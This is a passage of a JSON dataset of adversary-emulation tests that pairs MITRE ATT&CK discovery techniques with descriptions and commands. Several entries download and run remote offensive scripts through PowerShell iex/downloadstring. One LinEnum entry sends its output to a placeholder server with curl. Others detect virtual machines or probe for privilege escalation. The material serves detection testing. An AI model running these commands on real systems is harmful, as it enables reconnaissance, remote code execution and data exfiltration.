         "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n",
         "command": "sudo defaults read /Library/Preferences/com.apple.alf; sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
         "command": "ipconfig /all && netsh interface show interface && arp -a && nbtstat -n && net config"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet)"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
         "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi; "
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
         "command": "netsh advfirewall firewall show rule name=all"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n",
         "command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
         "command": "ipconfig /all && net config workstation && net view /all /domain && nltest /domain_trusts"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Capture the local network broadcast IP address",
         "command": "ifconfig | grep broadcast"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "View all potential WIFI networks on host",
         "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Find Domain information",
         "command": "nbtstat -n\n"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Ping a remote host to see if it is accessible",
         "command": "ping #{remote.host.fqdn}\n"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "Ping the network in order to build the ARP cache",
         "command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "See the most used WIFI networks of a machine",
         "command": "./wifi.sh pref\n"
      },
      {
         "technique_id": "T1016",
         "technique_name": "System Network Configuration Discovery",
         "tactic": "discovery",
         "description": "View network configuration info for host",
         "command": "sudo ifconfig\n"
      }
   ],
   "T1482": [
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
         "command": "nltest /domain_trusts && nltest /trusted_domains"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
         "command": "Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
         "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -gcb -sc trustdmp"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit)"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" forest -n %userdomain% && \"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" domain -n %userdomain%"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose"
      },
      {
         "technique_id": "T1482",
         "technique_name": "Domain Trust Discovery",
         "tactic": "discovery",
         "description": "Determine the Windows Domain of a computer",
         "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n"
      }
   ],
   "T1615": [
      {
         "technique_id": "T1615",
         "technique_name": "Group Policy Discovery",
         "tactic": "discovery",
         "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPORemoteAccessPolicy -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1615",
         "technique_name": "Group Policy Discovery",
         "tactic": "discovery",
         "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
         "command": "gpresult /z"
      },
      {
         "technique_id": "T1615",
         "technique_name": "Group Policy Discovery",
         "tactic": "discovery",
         "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
         "command": "Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt"
      },
      {
         "technique_id": "T1615",
         "technique_name": "Group Policy Discovery",
         "tactic": "discovery",
         "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPOAudit -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1615",
         "technique_name": "Group Policy Discovery",
         "tactic": "discovery",
         "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
         "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\""
      }
   ],
   "T1217": [
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
         "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\; cat /tmp/T1217-Chrome.txt 2>/dev/null"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
         "command": "where /R C:\\Users\\ Bookmarks"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n",
         "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\; cat /tmp/T1217-Firefox.txt 2>/dev/null"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n",
         "command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> /tmp/T1217-Safari.txt ; cat /tmp/T1217-Safari.txt"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n",
         "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/T1217_Firefox.txt \\; cat /tmp/T1217_Firefox.txt 2>/dev/null"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
         "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n",
         "command": "where /R C:\\Users\\ places.sqlite"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder",
         "command": "dir /s /b %USERPROFILE%\\Favorites"
      },
      {
         "technique_id": "T1217",
         "technique_name": "Browser Bookmark Discovery",
         "tactic": "discovery",
         "description": "Get Chrome Bookmarks",
         "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n"
      }
   ],
   "T1082": [
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
         "command": "csrutil status"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Collect general computer informations via GeneralRecon function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
         "command": "set"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify system hostname for Linux and macOS systems.\n",
         "command": "hostname"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
         "command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\""
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
         "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "General privesc checks using the otherchecks function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
         "command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\""
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Powersploits privesc checks using oldchecks function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be\nused for Exploitation. \ncommand /v - provide verbose output but not valid for signed drivers\n        /si - provide information about signed drivers \n",
         "command": "driverquery /v && driverquery /si"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
         "command": "cscript \"d06deb_griffon_recon.vbs\""
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
         "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      ; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential; Connect-AzureAD -Credential $Credential; Scan-AzureAdmins -UseCurrentCred"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
         "command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion && reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"; pause"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
         "command": "env"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
         "command": "lsmod; kmod list; grep vmw /proc/modules"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
         "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi; if [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi; if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi; if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi; if [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi; if [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify System Info\n",
         "command": "system_profiler; ls -al /Applications"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
         "command": "systeminfo && reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
         "command": "hostname"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Gathers local system information using the Morerecon function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
         "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"; sudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"; sudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"; sudo lsmod | grep -i \"virtio_pci\\|virtio_net\"; sudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\""
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
         "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Identify System Info\n",
         "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Download and execute LinEnum.sh",
         "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Discover the PowerShell version",
         "command": "$PSVersionTable\n"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Find OS Version",
         "command": "[environment]::OSVersion.Version\n"
      },
      {
         "technique_id": "T1082",
         "technique_name": "System Information Discovery",
         "tactic": "discovery",
         "description": "Discover all directories containing deletable files by user",
         "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"
      }
   ],
   "T1018": [
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
         "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip neighbour show"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
         "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
         "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
         "command": "Get-AdComputer -Filter *"
      },
      {
         "technique_id": "T1018",
         "technique_name": "Remote System Discovery",
         "tactic": "discovery",
